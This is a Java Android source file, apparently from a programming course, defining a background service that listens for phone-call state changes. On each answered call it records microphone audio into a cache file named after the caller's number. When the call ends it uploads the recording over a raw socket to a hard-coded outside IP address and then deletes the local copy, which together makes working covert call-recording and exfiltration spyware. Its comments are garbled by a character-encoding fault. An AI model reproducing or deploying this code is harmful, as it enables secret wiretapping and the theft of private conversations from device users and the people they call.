package cn.itcast.phone;

import java.io.File;
import java.io.OutputStream;
import java.io.PushbackInputStream;
import java.io.RandomAccessFile;
import java.net.Socket;

import cn.itcast.utils.StreamTool;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

public class PhoneListenService extends Service {
	private static final String TAG = "PhoneListenService";

	@Override
	public void onCreate() {
		TelephonyManager telManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		telManager.listen(new TelListener(), PhoneStateListener.LISTEN_CALL_STATE);
		Log.i(TAG, "service created");
		super.onCreate();
	}
	
	@Override
	public void onDestroy() {//��ջ���Ŀ¼�µ������ļ�
		File[] files = getCacheDir().listFiles();
		if(files!=null){
			for(File f: files){
				f.delete();
			}
		}
		Log.i(TAG, "service destroy");
		super.onDestroy();
	}

	private class TelListener extends PhoneStateListener{
		private MediaRecorder recorder;
		private String mobile;
		private File audioFile;
		private boolean record;
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			try {
				switch (state){
				case TelephonyManager.CALL_STATE_IDLE: /* ���κ�״̬ʱ */
					if(record){
						recorder.stop();//ֹͣ��¼
						recorder.release();
						record = false;
						new Thread(new UploadTask()).start();
						Log.i(TAG, "start upload file");
					}
					break;
					
				case TelephonyManager.CALL_STATE_OFFHOOK: /* ����绰ʱ */
					 Log.i(TAG, "OFFHOOK:"+ mobile);
					 recorder = new MediaRecorder();
					 recorder.setAudioSource(MediaRecorder.AudioSource.MIC);//����˷�ɼ�����
					 recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);//���������ʽ
					 recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);//��Ƶ���뷽ʽ
					 
					 audioFile = new File(getCacheDir(), mobile+"_"+ System.currentTimeMillis()+".3gp");
					 recorder.setOutputFile(audioFile.getAbsolutePath());
					 recorder.prepare();//Ԥ��׼��
					 recorder.start();   //��ʼ��¼
					 record = true;
					 break;	
					
				case TelephonyManager.CALL_STATE_RINGING: /* �绰����ʱ */
					Log.i(TAG, "incomingNumber:"+ incomingNumber);
					mobile = incomingNumber;
					break;
					
				default:
					break;
				}
			} catch (Exception e) {
				Log.e(TAG, e.toString());
			}
			super.onCallStateChanged(state, incomingNumber);
		}
		
		private final class UploadTask implements Runnable{
			@Override
			public void run() {
				try {
					Socket socket = new Socket("220.113.15.71", 7878);
		            OutputStream outStream = socket.getOutputStream();
		            String head = "Content-Length="+ audioFile.length() + ";filename="+ audioFile.getName() + ";sourceid=\r\n";
		            outStream.write(head.getBytes());
		            
		            PushbackInputStream inStream = new PushbackInputStream(socket.getInputStream());	
					String response = StreamTool.readLine(inStream);
		            String[] items = response.split(";");
					String position = items[1].substring(items[1].indexOf("=")+1);
					
					RandomAccessFile fileOutStream = new RandomAccessFile(audioFile, "r");
					fileOutStream.seek(Integer.valueOf(position));
					byte[] buffer = new byte[1024];
					int len = -1;
					while( (len = fileOutStream.read(buffer)) != -1){
						outStream.write(buffer, 0, len);
					}
					fileOutStream.close();
					outStream.close();
		            inStream.close();
		            socket.close();
		            audioFile.delete();
		        } catch (Exception e) {                    
		        	Log.e(TAG, e.toString());
		        }
			}
		}
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

}
